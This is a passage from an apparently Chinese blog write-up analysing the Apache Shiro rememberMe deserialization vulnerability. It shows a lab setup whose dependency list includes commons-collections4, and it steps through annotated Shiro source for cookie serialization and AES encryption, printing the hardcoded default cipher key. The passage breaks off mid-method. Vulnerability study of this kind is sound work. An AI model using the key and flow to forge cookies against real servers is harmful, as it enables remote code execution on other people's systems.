class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-log4j12<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>net.sourceforge.htmlunit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>htmlunit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- &lt;scope&gt;test&lt;/scope&gt; --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mortbay.jetty<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jetty<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;jetty.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mortbay.jetty<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jsp-2.1-jetty<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;jetty.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jcl-over-slf4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>使用maven3.1.1版本，使用jdk1.6进行package<br>成功打包war包后，启动tomcat运行<br>搭建成功界面<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230829144420.png"><br>使用用户名和密码进行登录，登录时需要点击“Remember Me”<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230829145126.png"><br>抓包分析<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230829145049.png"></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="remeberMe的生成过程"><a href="#remeberMe的生成过程" class="headerlink" title="remeberMe的生成过程"></a>remeberMe的生成过程</h3><p>在org&#x2F;apache&#x2F;shiro&#x2F;web&#x2F;mgt&#x2F;CookieRememberMeManager类的rememberSerializedIdentity函数下断点，从函数字面可以猜测这应该是cookie设置的地方<br>函数调用栈：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">rememberSerializedIdentity:<span class="number">156</span>, CookieRememberMeManager (org.apache.shiro.web.mgt)</span><br><span class="line">rememberIdentity:<span class="number">347</span>, AbstractRememberMeManager (org.apache.shiro.mgt)</span><br><span class="line">rememberIdentity:<span class="number">321</span>, AbstractRememberMeManager (org.apache.shiro.mgt)</span><br><span class="line">onSuccessfulLogin:<span class="number">297</span>, AbstractRememberMeManager (org.apache.shiro.mgt)</span><br><span class="line">rememberMeSuccessfulLogin:<span class="number">206</span>, DefaultSecurityManager (org.apache.shiro.mgt)</span><br><span class="line">onSuccessfulLogin:<span class="number">291</span>, DefaultSecurityManager (org.apache.shiro.mgt)</span><br><span class="line">login:<span class="number">285</span>, DefaultSecurityManager (org.apache.shiro.mgt)</span><br><span class="line">login:<span class="number">256</span>, DelegatingSubject (org.apache.shiro.subject.support)</span><br><span class="line">executeLogin:<span class="number">53</span>, AuthenticatingFilter (org.apache.shiro.web.filter.authc)</span><br><span class="line">onAccessDenied:<span class="number">154</span>, FormAuthenticationFilter (org.apache.shiro.web.filter.authc)</span><br><span class="line">onAccessDenied:<span class="number">133</span>, AccessControlFilter (org.apache.shiro.web.filter)</span><br><span class="line">onPreHandle:<span class="number">162</span>, AccessControlFilter (org.apache.shiro.web.filter)</span><br><span class="line">isFilterChainContinued:<span class="number">203</span>, PathMatchingFilter (org.apache.shiro.web.filter)</span><br><span class="line">preHandle:<span class="number">178</span>, PathMatchingFilter (org.apache.shiro.web.filter)</span><br><span class="line">doFilterInternal:<span class="number">131</span>, AdviceFilter (org.apache.shiro.web.servlet)</span><br><span class="line">doFilter:<span class="number">125</span>, OncePerRequestFilter (org.apache.shiro.web.servlet)</span><br><span class="line">doFilter:<span class="number">66</span>, ProxiedFilterChain (org.apache.shiro.web.servlet)</span><br><span class="line">executeChain:<span class="number">449</span>, AbstractShiroFilter (org.apache.shiro.web.servlet)</span><br><span class="line">call:<span class="number">365</span>, AbstractShiroFilter$<span class="number">1</span> (org.apache.shiro.web.servlet)</span><br><span class="line">doCall:<span class="number">90</span>, SubjectCallable (org.apache.shiro.subject.support)</span><br><span class="line">call:<span class="number">83</span>, SubjectCallable (org.apache.shiro.subject.support)</span><br><span class="line">execute:<span class="number">383</span>, DelegatingSubject (org.apache.shiro.subject.support)</span><br><span class="line">doFilterInternal:<span class="number">362</span>, AbstractShiroFilter (org.apache.shiro.web.servlet)</span><br><span class="line">doFilter:<span class="number">125</span>, OncePerRequestFilter (org.apache.shiro.web.servlet)</span><br><span class="line">internalDoFilter:<span class="number">178</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">153</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">167</span>, StandardWrapperValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">90</span>, StandardContextValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">492</span>, AuthenticatorBase (org.apache.catalina.authenticator)</span><br><span class="line">invoke:<span class="number">130</span>, StandardHostValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">93</span>, ErrorReportValve (org.apache.catalina.valves)</span><br><span class="line">invoke:<span class="number">673</span>, AbstractAccessLogValve (org.apache.catalina.valves)</span><br><span class="line">invoke:<span class="number">74</span>, StandardEngineValve (org.apache.catalina.core)</span><br><span class="line">service:<span class="number">343</span>, CoyoteAdapter (org.apache.catalina.connector)</span><br><span class="line">service:<span class="number">389</span>, Http11Processor (org.apache.coyote.http11)</span><br><span class="line">process:<span class="number">63</span>, AbstractProcessorLight (org.apache.coyote)</span><br><span class="line">process:<span class="number">926</span>, AbstractProtocol$ConnectionHandler (org.apache.coyote)</span><br><span class="line">doRun:<span class="number">1791</span>, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br><span class="line">run:<span class="number">49</span>, SocketProcessorBase (org.apache.tomcat.util.net)</span><br><span class="line">runWorker:<span class="number">1191</span>, ThreadPoolExecutor (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">659</span>, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">61</span>, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">832</span>, Thread (java.lang)</span><br></pre></td></tr></table></figure>
+
+<p>从正向开始分析，从onSuccessfulLogin方法开始</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onSuccessfulLogin</span><span class="params">(Subject subject, AuthenticationToken token, AuthenticationInfo info)</span> &#123;</span><br><span class="line">    <span class="comment">//always clear any previous identity:</span></span><br><span class="line">    <span class="comment">//清除之前的身份信息</span></span><br><span class="line">    forgetIdentity(subject);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//now save the new identity:</span></span><br><span class="line">    <span class="comment">//检查登入令牌是否请求了“Remeber Me”功能</span></span><br><span class="line">    <span class="keyword">if</span> (isRememberMe(token)) &#123;</span><br><span class="line">        <span class="comment">//根据相关的信息生成新的身份信息</span></span><br><span class="line">        rememberIdentity(subject, token, info);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">            log.debug(<span class="string">&quot;AuthenticationToken did not indicate RememberMe is requested.  &quot;</span> +</span><br><span class="line">                    <span class="string">&quot;RememberMe functionality will not be executed for corresponding account.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以进入isRememberMe方法查看如何进行判断的</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">boolean</span> <span class="title function_">isRememberMe</span><span class="params">(AuthenticationToken token)</span> &#123;</span><br><span class="line">    <span class="comment">// 第一个条件检查的是令牌是否为空</span></span><br><span class="line">    <span class="comment">// 第二个条件检查的是登录令牌token是否是RememberMeAuthenticationToken类型实例</span></span><br><span class="line">    <span class="comment">// 第三个条件是进一步调用实例中的isRememberMe方法</span></span><br><span class="line">    <span class="keyword">return</span> token != <span class="literal">null</span> &amp;&amp; (token <span class="keyword">instanceof</span> RememberMeAuthenticationToken) &amp;&amp;</span><br><span class="line">            ((RememberMeAuthenticationToken) token).isRememberMe();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>token是UsernamePasswordToken类对象，所以进入到此对象的isRememberMe方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isRememberMe</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> rememberMe;</span><br><span class="line">&#125;   </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230829171009.png"><br>进入if条件中的rememberIdentity函数</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">rememberIdentity</span><span class="params">(Subject subject, AuthenticationToken token, AuthenticationInfo authcInfo)</span> &#123;</span><br><span class="line">    <span class="comment">// 从身份验证信息中提取用户的主体身份信息</span></span><br><span class="line">    <span class="type">PrincipalCollection</span> <span class="variable">principals</span> <span class="operator">=</span> getIdentityToRemember(subject, authcInfo);</span><br><span class="line">    <span class="comment">// 将用户的主体身份信息保存起来</span></span><br><span class="line">    rememberIdentity(subject, principals);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230829202529.png"><br>进入重载的rememberIdentity函数</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">rememberIdentity</span><span class="params">(Subject subject, PrincipalCollection accountPrincipals)</span> &#123;</span><br><span class="line">    <span class="comment">// 将主体身份信息转换为字节数组（byte[]）的形式</span></span><br><span class="line">    <span class="type">byte</span>[] bytes = convertPrincipalsToBytes(accountPrincipals);</span><br><span class="line">    <span class="comment">// 将序列化后的身份信息保存起来，以便在下次需要恢复用户身份时使用</span></span><br><span class="line">    rememberSerializedIdentity(subject, bytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230829202955.png"><br>这里的关键是进入convertPrincipalsToBytes方法，通过这个函数将身份的相关信息转换成了byte数组</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">byte</span>[] convertPrincipalsToBytes(PrincipalCollection principals) &#123;</span><br><span class="line">    <span class="comment">// 先将身份信息进行序列化，转换成字节流</span></span><br><span class="line">    <span class="type">byte</span>[] bytes = serialize(principals);</span><br><span class="line">    <span class="comment">// getCipherService获取密码服务的实例</span></span><br><span class="line">    <span class="keyword">if</span> (getCipherService() != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 对序列化后的字节流进行加密</span></span><br><span class="line">        bytes = encrypt(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> bytes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>先来了解getCipherService函数</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> CipherService <span class="title function_">getCipherService</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> cipherService;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其实就是返回一个类的属性，查看该类的构造函数观察对应属性的赋值</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">AbstractRememberMeManager</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 创建一个默认的序列化器</span></span><br><span class="line">    <span class="built_in">this</span>.serializer = <span class="keyword">new</span> <span class="title class_">DefaultSerializer</span>&lt;PrincipalCollection&gt;();</span><br><span class="line">    <span class="comment">// 创建一个AES加密算法的密码服务</span></span><br><span class="line">    <span class="built_in">this</span>.cipherService = <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">    <span class="comment">// 设置密钥</span></span><br><span class="line">    setCipherKey(DEFAULT_CIPHER_KEY_BYTES);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>根据类名应该可以得知这里使用的是AES算法，从上下文可以获得固定在源码中的密钥</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">byte</span>[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>获取到加密的服务之后，进入if中调用encrypt函数进行加密</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">byte</span>[] encrypt(<span class="type">byte</span>[] serialized) &#123;</span><br><span class="line">    <span class="comment">// 序列化后的身份信息</span></span><br><span class="line">    <span class="type">byte</span>[] value = serialized;</span><br><span class="line">    <span class="comment">// 获取密码服务的实例</span></span><br><span class="line">    <span class="type">CipherService</span> <span class="variable">cipherService</span> <span class="operator">=</span> getCipherService();</span><br><span class="line">    <span class="keyword">if</span> (cipherService != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 调用加密算法，对序列化的数据进行加密</span></span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">byteSource</span> <span class="operator">=</span> cipherService.encrypt(serialized, getEncryptionCipherKey());</span><br><span class="line">        value = byteSource.getBytes();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230829211026.png"><br>进入encrypt方法,这里进入的是JcaCipherService类的encrypt方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ByteSource <span class="title function_">encrypt</span><span class="params">(<span class="type">byte</span>[] plaintext, <span class="type">byte</span>[] key)</span> &#123;</span><br><span class="line">    <span class="comment">// 用于存储初始化向量</span></span><br><span class="line">    <span class="type">byte</span>[] ivBytes = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">// 用于检查是否启用了生成初始化向量的选项</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">generate</span> <span class="operator">=</span> isGenerateInitializationVectors(<span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">if</span> (generate) &#123;</span><br><span class="line">        <span class="comment">// 生成初始化向量</span></span><br><span class="line">        ivBytes = generateInitializationVector(<span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">if</span> (ivBytes == <span class="literal">null</span> || ivBytes.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Initialization vector generation is enabled - generated vector&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;cannot be null or empty.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 调用重载的加密方法</span></span><br><span class="line">    <span class="keyword">return</span> encrypt(plaintext, key, ivBytes, generate);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230829212305.png"><br>初始iv是如何生成的？<br>查看generateInitializationVector方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">byte</span>[] generateInitializationVector(<span class="type">boolean</span> streaming) &#123;</span><br><span class="line">    <span class="comment">// 获取初始向量的大小</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> getInitializationVectorSize();</span><br><span class="line">    <span class="keyword">if</span> (size &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;initializationVectorSize property must be greater than zero.  This number is &quot;</span> +</span><br><span class="line">                <span class="string">&quot;typically set in the &quot;</span> + CipherService.class.getSimpleName() + <span class="string">&quot; subclass constructor.  &quot;</span> +</span><br><span class="line">                <span class="string">&quot;Also check your configuration to ensure that if you are setting a value, it is positive.&quot;</span>;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(msg);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 初始向量大小需要是8的倍数   BITS_PER_BYTE表示8</span></span><br><span class="line">    <span class="keyword">if</span> (size % BITS_PER_BYTE != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;initializationVectorSize property must be a multiple of 8 to represent as a byte array.&quot;</span>;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(msg);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 字节数</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">sizeInBytes</span> <span class="operator">=</span> size / BITS_PER_BYTE;</span><br><span class="line">    <span class="comment">// 创建字节数组</span></span><br><span class="line">    <span class="type">byte</span>[] ivBytes = <span class="keyword">new</span> <span class="title class_">byte</span>[sizeInBytes];</span><br><span class="line">    <span class="comment">// 获取一个安全的随机数生成器</span></span><br><span class="line">    <span class="type">SecureRandom</span> <span class="variable">random</span> <span class="operator">=</span> ensureSecureRandom();</span><br><span class="line">    <span class="comment">// 使用随机数生成器生成随机字节</span></span><br><span class="line">    random.nextBytes(ivBytes);</span><br><span class="line">    <span class="keyword">return</span> ivBytes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>查看向量大小的生成getInitializationVectorSize方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getInitializationVectorSize</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> initializationVectorSize;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>返回一个属性值，查看其构造方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">JcaCipherService</span><span class="params">(String algorithmName)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!StringUtils.hasText(algorithmName)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;algorithmName argument cannot be null or empty.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">this</span>.algorithmName = algorithmName;</span><br><span class="line">    <span class="built_in">this</span>.keySize = DEFAULT_KEY_SIZE;</span><br><span class="line">    <span class="comment">// DEFAULT_KEY_SIZE指128</span></span><br><span class="line">    <span class="built_in">this</span>.initializationVectorSize = DEFAULT_KEY_SIZE; <span class="comment">//default to same size as the key size (a common algorithm practice)</span></span><br><span class="line">    <span class="built_in">this</span>.streamingBufferSize = DEFAULT_STREAMING_BUFFER_SIZE;</span><br><span class="line">    <span class="built_in">this</span>.generateInitializationVectors = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>综上所述，这里的iv是随机生成的16位字节<br>进入重载的encrypt方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> ByteSource <span class="title function_">encrypt</span><span class="params">(<span class="type">byte</span>[] plaintext, <span class="type">byte</span>[] key, <span class="type">byte</span>[] iv, <span class="type">boolean</span> prependIv)</span> <span class="keyword">throws</span> CryptoException &#123;</span><br><span class="line">    <span class="comment">// 